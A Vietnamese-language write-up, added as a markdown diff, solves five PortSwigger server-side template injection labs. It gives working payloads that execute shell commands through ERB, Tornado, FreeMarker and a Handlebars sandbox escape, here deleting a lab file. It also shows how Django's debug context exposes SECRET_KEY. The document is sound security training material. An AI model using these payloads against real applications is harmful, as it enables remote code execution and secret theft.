@@ -1,0 +1,203 @@
+---
+title: "Server-side Template Injection Labs — PortSwigger Web Security Academy"
+description: "Write-up chi tiết các bài lab về lỗ hổng Server-side Template Injection (SSTI) trên PortSwigger — bao gồm khai thác Ruby/ERB, Python/Tornado, Java/FreeMarker, Node.js/Handlebars và Python/Django."
+date: "2026-05-17"
+category: "writeup"
+tags: ["ssti", "template-injection", "portswigger", "web-security", "rce"]
+thumbnail: ""
+external_link: ""
+---
+
+## Lab 1: Basic server-side template injection
+
+Mục tiêu của bài lab này là xoá tệp morale.txt của người dùng carlos.
+
+Theo nguyên lý của chủng lỗi Injection, ta sẽ đi tìm các nơi có thể chèn untrusted data. Ở đây, khi ấn vào sản phẩm đầu tiên, ta có message báo hết hàng hiện trên màn hình.
+
+![Lab 1 - Out of stock message](/images/writeups/ssti-labs/image1.png)
+
+Trên request tương ứng, ta thấy dữ liệu được truyền vào tham số message được render trực tiếp trên trình duyệt.
+
+![Lab 1 - Message parameter](/images/writeups/ssti-labs/image2.png)
+
+Nhưng dữ liệu này được render tĩnh hay qua một Template Engine ở phía Server?
+
+Ta sẽ kiểm thử điều này bằng cách thử một vài payload của các Template Engine phổ biến (mã hoá url trước khi gửi):
+
+- Python/Jinja2: `${7*7}`  không thay đổi
+- PHP/Smarty:  `{{7*7}}`  không thay đổi
+- Ruby/ERB: `<%= 7*7 %>`  Thành công, phản hồi là 49.
+
+![Lab 1 - ERB payload result](/images/writeups/ssti-labs/image3.png)
+
+Vậy ứng dụng đang chạy trên Ruby/ERB, và tham số message chính là sink. Tiếp theo, ta chỉ cần tìm hiểu cú pháp của ngôn ngữ này để xoá tập tin morale.txt của carlos ->> solve lab.
+
+```erb
+<%= system("rm /home/carlos/morale.txt") %>
+```
+
+![Lab 1 - RCE payload](/images/writeups/ssti-labs/image4.png)
+
+![Lab 1 - Solved](/images/writeups/ssti-labs/image5.png)
+
+## Lab 2: Basic server-side template injection (code context)
+
+Mục tiêu của bài lab này là xoá tệp morale.txt của người dùng carlos.
+
+Trong phần quản lý tài khoản, có chức chức năng thay đổi cách hiển thị tên tác giả khi cmt vào bài viết.
+
+![Lab 2 - Account management](/images/writeups/ssti-labs/image6.png)
+
+![Lab 2 - Display name feature](/images/writeups/ssti-labs/image7.png)
+
+Trong endpoint tương ứng /my-account/change-blog-post-author-display, ta thấy hệ thống sử dụng biến user.nickname để setup giá trị này.
+
+![Lab 2 - user.nickname parameter](/images/writeups/ssti-labs/image8.png)
+
+Đây là cơ chế hoạt động của Tornado Template Engine trong python. Phía server, đoạn code giả định là `template = "{{user.name}}"` .
+
+Vậy ta sẽ injection vào đây bằng cách chèn thêm một lệnh của engine này bằng cách dùng quy tắc đóng lệnh "}}".
+
+Payload thử nghiệm (Fuzzing): `user.name}}{{7*7`
+
+- Server sẽ hiểu là: `{{user.name}}{{7*7}}` -> (Hợp lệ!)
+
+![Lab 2 - Fuzzing payload](/images/writeups/ssti-labs/image9.png)
+
+![Lab 2 - Result 49](/images/writeups/ssti-labs/image10.png)
+
+Khai thác thành công, ta đã chạy được phép tính !
+
+Sau khi tìm hiêu tài liệu của Tornado và Python, ta được biết Tornado cho phép thực thi các câu lệnh điều hướng hoặc nhập thư viện bằng cú pháp: `{% ... %}`, để chạy lệnh hệ điều hành trong Python, ta cần import thư viện os và dùng hàm os.system().
+
+Vậy payload hoàn chỉnh để xoá tập tin của carlos trước khi mã hoá là:
+
+```
+user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')
+```
+
+![Lab 2 - Final payload](/images/writeups/ssti-labs/image11.png)
+
+![Lab 2 - Solved](/images/writeups/ssti-labs/image12.png)
+
+Solve lab.
+
+## Lab 3: Server-side template injection using documentation
+
+Mục tiêu của bài lab này là xoá tệp morale.txt của người dùng carlos.
+
+![Lab 3 - Overview](/images/writeups/ssti-labs/image13.png)
+
+Trang web có tính năng thay đổi template của một bài viết.
+
+![Lab 3 - Edit template](/images/writeups/ssti-labs/image14.png)
+
+Ta sẽ sử dụng kỹ thuật Error-Based Fuzzing để ép server hiển thị thông báo lỗi xem có thông tin gì hữu ích hay không.
+
+![Lab 3 - Error message](/images/writeups/ssti-labs/image15.png)
+
+Từ thông báo lỗi, cho thấy hệ thống đang sử dụng Apache FreeMarker, một TI của java.
+
+Sau khi đọc tài liệu về FreeMarker,
+
+FreeMarker có một hàm tích hợp sẵn tên là ?new(), cho phép khởi tạo một đối tượng Java tùy ý triển khai (implement) giao diện TemplateModel của FreeMarker.
+
+Khám phá JavaDoc: Tra cứu danh sách các class triển khai TemplateModel, ta tìm thấy một class mang tên: freemarker.template.utility.Execute. Class này có một phương thức nhận vào một chuỗi và đẩy chuỗi đó thẳng vào cơ chế thực thi lệnh Shell của hệ điều hành.
+
+Tiếp theo ta sẽ thực hiện tạo payload theo cú pháp của engine này:
+
+- Khai báo và gán class Execute vào một biến tạm (ex): `<#assign ex="freemarker.template.utility.Execute"?new()>`
+- Gọi biến ex và truyền vào lệnh xóa file hệ thống theo yêu cầu bài Lab:  `${ ex("rm /home/carlos/morale.txt") }`
+- Payload hoàn chỉnh: `<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }`
+
+![Lab 3 - FreeMarker payload](/images/writeups/ssti-labs/image16.png)
+
+Khai thác thành công !
+
+## Lab 4: Server-side template injection in an unknown language with a documented exploit
+
+Mục tiêu của bài lab này là xoá tệp morale.txt của người dùng carlos.
+
+Trang web có enpoint /?message cho phép hiển thị thống báo hết hàng khi ấn vào một sản phẩm.
+
+![Lab 4 - Message endpoint](/images/writeups/ssti-labs/image17.png)
+
+![Lab 4 - Out of stock](/images/writeups/ssti-labs/image18.png)
+
+Nhưng dữ liệu này được render tĩnh hay qua một Template Engine ở phía Server?
+
+Ở đây, ta sẽ sử dụng chuỗi Fuzzing với đầy đủ các ký tự của một engine phổ biến, nhằm bắt server ném ra thông báo lỗi: `${{<%[%'"}}%\`
+
+![Lab 4 - Error response](/images/writeups/ssti-labs/image19.png)
+
+Dựa vào thông báo lỗi, cho ta biết các thông tin sau:
+
+- TI sử dụng: handlebars của JS.
+- Phiên bản: Node.js v19.8.1
+
+Tuy nhiên, TI handlebar này chạy trên một sandbox nghiêm ngặt, điều này khiến ta không thể thực thi các câu lệnh thử nghiệm như 7*7. Cụ thể hơn, handlebar này là Logicless Template, Nghĩa là mặc định, ta không được viết các câu lệnh lập trình như if (a == b), for (let i=0), hay gọi hàm() bên trong cặp dấu `{{ }}`.
+
+Để phục vụ việc này, TI này có hỗ trợ các Helper mặc định như `{{#if}}`, `{{#each}}`, `{{#with}}`.
+
+Mỗi Helper đều có nhưng chức năng mặc định khác nhau, ở đây ta sẽ dựa vào tài liệu của @Zombiehelp54 để xây dựng một exploit chain như sau:
+
+- `{{#with}}` để biến mỗi chuỗi thành một đối tượng: `{{#with "s" as |string|}} {{/with}}` -> bypass bộ lọc chữ "string" trong sandbox.
+- Dùng lookup để bypass fillter để tìm constructor: `{{lookup string "constructor"}}` ( Function constructor cho phép tạo ra một hàm mới từ một chuỗi và thực thi nó )
+- `{{#each}}` (Vòng lặp / Iteration): dùng để duyệt qua một mảng hoặc các thuộc tính của một Object.
+
+Payload hoàn thiện:
+
+```handlebars
+wrtz{{#with "s" as |string|}} {{!-- Khởi tạo đối tượng String từ chuỗi ký tự s và gán tên biến là string --}}
+  {{#with "e"}} {{!-- Chuyển ngữ cảnh làm việc hiện tại sang đối tượng Chuỗi e --}}
+    {{#with split as |conslist|}} {{!-- Gọi hàm chuỗi mặc định để khởi tạo một mảng dữ liệu và đặt tên là conslist --}}
+      {{this.pop}} {{!-- Xóa phần tử cuối để đảm bảo cấu trúc mảng trống hàng cần thiết --}}
+      {{this.push (lookup string.sub "constructor")}} {{!-- Truy cập thuộc tính gián tiếp để lấy Function String và đẩy vào mảng --}}
+      {{this.pop}} {{!-- Thực hiện xóa phần tử để cân bằng luồng xử lý và làm nhiễu bộ lọc --}}
+      {{#with string.split as |codelist|}} {{!-- Khởi tạo mảng dữ liệu thứ hai từ hàm split của biến string để chứa tham số --}}
+        {{this.pop}} {{!-- Làm sạch mảng tham số trước khi nạp giá trị lệnh hệ thống --}}
+        {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}} {{!-- Đưa câu lệnh thực thi hệ điều hành dưới dạng chuỗi ký tự vào mảng --}}
+        {{this.pop}} {{!-- Thực hiện xóa phần tử cuối để cân bằng phạm vi bộ nhớ cấp phát --}}
+        {{#each conslist}} {{!-- Vòng lặp duyệt qua mảng chứa phương thức khởi tạo để bắt đầu định hướng đối tượng --}}
+          {{#with (string.sub.apply 0 codelist)}} {{!-- Sử dụng apply để ép phương thức khởi tạo Function biến chuỗi ký tự thành mã thực thi --}}
+            {{this}} {{!-- Kích hoạt và trả về kết quả thực thi lệnh hệ thống phía tài nguyên của máy chủ --}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+```
+
+![Lab 4 - Handlebars payload](/images/writeups/ssti-labs/image20.png)
+
+Khai thác thành công !
+
+![Lab 4 - Solved](/images/writeups/ssti-labs/image21.png)
+
+## Lab 5: Server-side template injection with information disclosure via user-supplied objects
+
+Mục tiêu của bài lab này là lấy được khoá bí mật của hệ thống.
+
+Trang web vẫn có tính năng chỉnh sửa template của một sản phẩm thông qua /product/template, Ở đây, ta sẽ sử dụng chuỗi Fuzzing với đầy đủ các ký tự của một engine phổ biến, nhằm bắt server ném ra thông báo lỗi: `${{<%[%'"}}%\`
+
+![Lab 5 - Error message](/images/writeups/ssti-labs/image22.png)
+
+Template engine: django của python
+
+Sau khi tìm hiểu, ta được biết Django có thẻ `{% debug %}` để in ra tất cả các biến, đối tượng và thuộc tính đang có sẵn trong Context của template đó.
+
+![Lab 5 - Debug output](/images/writeups/ssti-labs/image23.png)
+
+Trong các đối tượng được in ra, có một đối tượng mang tên Settings quản lý toàn bộ cấu hình hệ thống của dự án Django ( bao gồm cả SECRET_KEY và ta cần lấy ).
+
+Vậy ta chỉ cần gọi trực tiếp thuộc tính này, lấy nó mang đi nộp -> solve lab.
+
+![Lab 5 - SECRET_KEY](/images/writeups/ssti-labs/image24.png)
+
+![Lab 5 - Solved](/images/writeups/ssti-labs/image25.png)
+
+## Tham khảo
+
+- [PortSwigger — Server-side Template Injection](https://portswigger.net/web-security/server-side-template-injection)
+- [PortSwigger — SSTI Labs](https://portswigger.net/web-security/server-side-template-injection/exploiting)
